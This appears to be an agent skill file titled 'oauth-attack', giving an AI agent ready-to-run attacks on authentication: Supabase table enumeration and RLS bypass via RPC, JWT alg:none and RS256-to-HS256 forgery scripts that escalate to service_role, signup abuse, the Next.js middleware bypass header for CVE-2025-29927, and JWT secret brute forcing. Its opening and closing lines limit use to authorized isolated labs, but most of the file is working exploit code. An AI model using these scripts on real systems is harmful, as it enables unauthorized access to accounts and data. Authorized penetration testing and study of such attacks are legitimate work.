---
name: oauth-attack
description: Assess OAuth, JWT, and identity flows in an isolated, authorized test environment.
---

> **Afterglow scope:** Use only in a locally isolated environment you own or are explicitly authorized to test. The local-only restriction takes precedence over any references below to online programs. Task scope is guidance; configure interception rules and network egress controls before testing.


# OAuth / JWT / Supabase Auth Attack

**Invoke this skill for OAuth flow abuse, JWT forgery, Supabase RLS bypass, and auth token attacks.**

## CVEs (2025-2026)
- CVE-2025-29927 — Next.js middleware bypass (CVSS 9.1, CISA KEV 2025-03-27)
- CVE-2024-23727 — JWT none algorithm acceptance (CVSS 9.8)
- CVE-2025-2725 — Supabase GoTrue auth bypass (CVSS 8.2)
- CVE-2024-55663 — Supabase JWT secret exposure via debug endpoints

## Supabase-Specific Attacks

### 1. Anonymous Key Exposure → Table Enumeration
```bash
ANON_KEY="${SUPABASE_ANON_KEY:?Set the authorized test project's key}"
SUPABASE_URL="https://PROJECT.supabase.co"

# Enumerate tables via PGRST error hints
for table in users profiles orders products admin customers settings payments webhooks; do
  result=$(curl -s "$SUPABASE_URL/rest/v1/$table?limit=1" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ANON_KEY" \
    -w "\n%{http_code}")
  echo "$table: $(echo $result | tail -1) $(echo $result | grep -o 'relation.*does not exist\|permission denied\|\[\]')"
done
```

### 2. JWT None Algorithm / RS256→HS256 Confusion
```python
#!/usr/bin/env python3
"""Try JWT algorithm confusion attacks."""
import base64, json, hmac, hashlib

def decode_jwt(token):
    parts = token.split(".")
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
    return payload

def forge_jwt_none(original_token, new_payload=None):
    """Forge JWT with alg:none (server must accept)."""
    parts = original_token.split(".")
    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    header["alg"] = "none"
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
    if new_payload:
        payload.update(new_payload)

    def b64url(data):
        return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b"=").decode()

    forged = f"{b64url(header)}.{b64url(payload)}."
    return forged

def forge_jwt_hs256(original_token, public_key_pem, new_payload=None):
    """RS256→HS256 confusion: sign with public key as HMAC secret."""
    parts = original_token.split(".")
    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
    header["alg"] = "HS256"
    if new_payload:
        payload.update(new_payload)

    def b64url(data):
        return base64.urlsafe_b64encode(json.dumps(data, separators=(",",":")).encode()).rstrip(b"=").decode()

    header_b64 = b64url(header)
    payload_b64 = b64url(payload)
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(public_key_pem.encode(), msg, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{header_b64}.{payload_b64}.{sig_b64}"

# Test: escalate role in Supabase JWT
import requests

# Valid user token
valid_token = "YOUR_VALID_JWT"
payload = decode_jwt(valid_token)
print("Current role:", payload.get("role"))

# Try none algorithm with admin role
admin_payload = {"role": "service_role", "aal": "aal1"}
forged = forge_jwt_none(valid_token, admin_payload)
resp = requests.get(
    "https://PROJECT.supabase.co/rest/v1/admin_users",
    headers={"Authorization": f"Bearer {forged}", "apikey": "ANON_KEY"}
)
print(f"none-alg admin attempt: {resp.status_code} {resp.text[:200]}")
```

### 3. Supabase Auth — Registration Flow Abuse
```bash
SUPABASE_URL="https://lab-project.supabase.example"
ANON_KEY="${SUPABASE_ANON_KEY:?Set the authorized test project's key}"

# Auto-confirm enabled (mailer_autoconfirm: true) — no email verification
curl -s -X POST "$SUPABASE_URL/auth/v1/signup" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@attacker.com","password":"Test@12345"}' | python3 -m json.tool

# Use returned access_token for RLS-constrained queries
# Try to access other users' data via IDOR in Supabase queries
```

### 4. RLS Bypass via Supabase RPC
```bash
# Sometimes RPC functions have weaker RLS than direct table access
SUPABASE_URL="https://lab-project.supabase.example"
ANON_KEY="..."
USER_TOKEN="..."  # from signup above

for func in get_all_users list_orders admin_report get_products export_data; do
  result=$(curl -s -X POST "$SUPABASE_URL/rest/v1/rpc/$func" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{}' -w "\n%{http_code}")
  echo "$func: $(echo $result | tail -1) $(echo $result | head -c 100)"
done
```

### 5. Next.js Middleware Bypass (CVE-2025-29927)
```bash
# Affects Next.js < 14.2.25, 15.x < 15.2.3
# Bypass authentication middleware with recursive subrequest header

TARGET="shop.lab.example"
# Test against protected routes
for path in /admin /dashboard /api/admin /api/users /checkout /orders; do
  normal=$(curl -sk "$TARGET$path" -w "%{http_code}" -o /dev/null)
  bypass=$(curl -sk "$TARGET$path" \
    -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
    -w "%{http_code}" -o /dev/null)
  if [ "$normal" != "$bypass" ]; then
    echo "BYPASS: $path normal=$normal bypass=$bypass"
  fi
done
```

### 6. OAuth State Parameter Forgery
```bash
# CSRF via missing/predictable state parameter
# 1. Initiate OAuth flow, capture state param
# 2. Forge state to redirect to attacker-controlled redirect_uri
curl -sk "https://TARGET/api/auth/google" -L -v 2>&1 | grep -i "state\|redirect_uri\|Location"
```

### 7. JWT Secret Brute Force
```python
#!/usr/bin/env python3
"""Brute force weak JWT secret."""
import jwt, base64

token = "YOUR_JWT_TOKEN"
# Common Supabase secrets / weak secrets
wordlist = [
    "secret", "supersecret", "jwt_secret", "your_jwt_secret",
    "supabase_jwt_secret", "change_me", "password", "12345678",
    "supabase", "artex", "shop-lab",
]

for word in wordlist:
    try:
        decoded = jwt.decode(token, word, algorithms=["HS256"])
        print("A candidate matched. Record the weakness without printing the signing secret or token claims.")
        break
    except:
        pass
print("Not found in quick wordlist")
```

## Test configuration

Replace example hosts and accounts with an operator-approved test project. Supply keys through protected environment variables. Do not store or print real account passwords, JWT signing keys, or access tokens in task output.
